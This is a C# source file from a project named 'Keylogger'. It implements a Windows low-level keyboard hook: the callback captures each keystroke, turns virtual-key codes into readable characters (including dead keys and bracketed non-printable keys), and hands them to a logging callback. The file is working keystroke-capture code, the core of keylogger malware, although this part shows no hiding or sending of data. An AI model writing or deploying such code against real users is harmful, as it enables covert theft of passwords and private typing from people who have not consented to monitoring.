using Keylogger.Helpers.Enums;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static Keylogger.Helpers.InputMessageHelper;
using static Keylogger.Helpers.KeyFilterHelper;
using static Keylogger.Helpers.Win32ErrorHelper;
using static Keylogger.Interop.Win32Api;

namespace Keylogger.Hooks
{
    internal static class KeyboardHook
    {
        public static Hookproc Hookproc => KeyboardHookCallback;

        public static Action<string, string, KeyType>? LogKeyCallback;
        public static Predicate<KeyboardMessage>? SelectedKeyboardEventPredicate;
        private static readonly byte[] _keyboardState = new byte[256];

        private static KeyType KeyType { get; set; }

        private static IntPtr KeyboardHookCallback(int code, UIntPtr wParam, IntPtr lParam)
        {
            if (code < 0 || SelectedKeyboardEventPredicate is null || !SelectedKeyboardEventPredicate.Invoke((KeyboardMessage)wParam))
            {
                return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
            }

            var keyboardStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
            var keyName = GetKeyName(keyboardStruct.vkCode);
            LogKeyCallback?.Invoke(GetKeyboardMessageName(wParam), keyName, KeyType);

            return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }

        private static string GetKeyName(uint vkCode)
        {
            if (!GetKeyboardState(_keyboardState))
            {
                Debug.WriteLine($"Error getting the keyboard state: {GetLastErrorMessage()}");
                return "Unknown key";
            }

            var scanCode = MapVirtualKeyW(vkCode, 0);
            var keyName = new char[16];
            var currentKeyboardLayout = GetKeyboardLayout(0);
            var result = ToUnicodeEx(vkCode, scanCode, _keyboardState, keyName, keyName.Length, 0, currentKeyboardLayout);

            // The specified virtual key is a dead key character (accent or diacritic).
            if (result < 0)
            {
                KeyType = KeyType.DeadKey;
                return $"{new string(keyName, 0, -result)}";
            }

            // The specified virtual key has no translation for the current state of the keyboard.
            if (result == 0 || result > 0 && IsNonPrintableKey(vkCode))
            {
                KeyType = KeyType.NonPrintableKey;
                return $"[{GetVirtualKeyName(vkCode)}]";
            }

            KeyType = KeyType.PrintableKey;
            return new string(keyName, 0, result);
        }
    }
}